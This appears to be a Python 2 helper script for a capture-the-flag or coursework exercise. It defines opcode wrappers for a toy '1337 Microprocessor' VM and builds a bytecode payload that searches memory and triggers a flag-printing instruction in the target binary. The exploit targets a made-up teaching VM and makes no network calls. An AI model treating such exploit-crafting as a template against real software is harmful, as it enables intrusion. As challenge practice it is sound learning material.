#!/usr/bin/python

# this is a starting place for exploiting the 1337 Microprocessor
# it has some helpful functions
# use like this:
# (./helper.py ; cat ) | ./Q1Compiled


import subprocess
from struct import pack

# Wrappers 
quit = chr(0)
inc_reg_1 = chr(1)
dec_reg_1 = chr(2)
inc_reg_2 = chr(3)
dec_reg_2 = chr(4)
set_f = chr(5)
set_word = chr(6)
get = chr(7)
get_word = chr(8)
load_r1 = lambda r1: chr(9) + chr(r1)
load_r1_word = lambda r1: chr(10) + pack('<I', r1)
load_r1_word_signed = lambda r1: chr(10) + pack('<i', r1)
print_f = chr(11)
swap = chr(12)
je = lambda addr: chr(13) + chr(addr)
jz = lambda addr: chr(14) + chr(addr)
jmp = lambda addr: chr(15) + chr(addr)
add = lambda addr: chr(16)
printEasyFlag = chr(17)

# Helpers
load_r2 = lambda r2: swap + load_r1(r2) + swap
load_r2_word = lambda r2: swap + load_r1_word(r2) + swap
save_r1 = lambda addr: swap + load_r1(addr) + set_f + swap # lose r2
save_r1_word = lambda addr: swap + load_r1_word(addr) + set_word + swap # lose r2
save_r1_word_signed = lambda addr: swap + load_r1_word_signed(addr) + set_word + swap # lose r2

tape = []
savedR1 = 70

tape += inc_reg_1 

tape += swap
tape += load_r1(savedR1) # load the save location of r1
tape += set_word # save
tape += swap
# R1 has been saved


tape += get # get what's at the address of R1, save to R2. first it will be -1, then -2 etc
tape += load_r1(0xaa-1)
tape += swap
tape += inc_reg_2 # R1:valueLoaded, R2: 'N'

tape += je(len(tape)+2 + 2 + 1 + 1 + 2)

tape += load_r1(savedR1)
tape += get_word
tape += swap
tape += jmp(0)

tape += load_r1(savedR1) 
tape += get_word
tape += load_r1(3)
tape += swap
tape += set_f
tape += printEasyFlag
tape += printEasyFlag
tape += printEasyFlag
tape += '\x00'
# tape += load_r1(70) + print_f
# while len(tape) < 70-1:
# 	tape += print_f
# tape += 
print ''.join(tape),
# tape += chr(0xff)*10
# tape += chr(0xff)*10
# tape += chr(0xff)*10
# tape += chr(0xaa)
# tape += chr(0xfe)*10

print ''.join(tape) #+ "Welcome to the 1337Micro!!!!"





